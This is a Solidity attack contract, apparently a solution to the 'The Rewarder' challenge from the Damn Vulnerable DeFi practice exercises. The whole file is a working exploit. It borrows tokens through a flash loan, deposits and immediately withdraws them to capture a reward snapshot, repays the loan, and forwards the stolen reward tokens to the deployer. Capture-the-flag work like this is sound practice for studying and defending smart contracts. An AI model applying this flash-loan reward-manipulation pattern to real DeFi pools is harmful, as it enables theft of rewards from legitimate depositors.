pragma solidity ^0.6.0;

import "../../the-rewarder/FlashLoanerPool.sol";
import "../../the-rewarder/TheRewarderPool.sol";
import "../../DamnValuableToken.sol";


contract TheRewarderAttacker {
    FlashLoanerPool flashLoans;
    TheRewarderPool rewarderPool;
    address owner;

    constructor (FlashLoanerPool _flashLoans, TheRewarderPool _rewarder) public {
        flashLoans = _flashLoans;
        rewarderPool = _rewarder;
        owner = msg.sender;
    }

    function executeAttack(uint256 _amount) public {
        flashLoans.flashLoan(_amount);
        uint256 balance = rewarderPool.rewardToken().balanceOf(address(this));
        rewarderPool.rewardToken().transfer(owner, balance);
    }

    function receiveFlashLoan(uint256 _amount) public {
        flashLoans.liquidityToken().approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewarderPool.withdraw(_amount);
        flashLoans.liquidityToken().transfer(address(flashLoans), _amount);
    }

    
}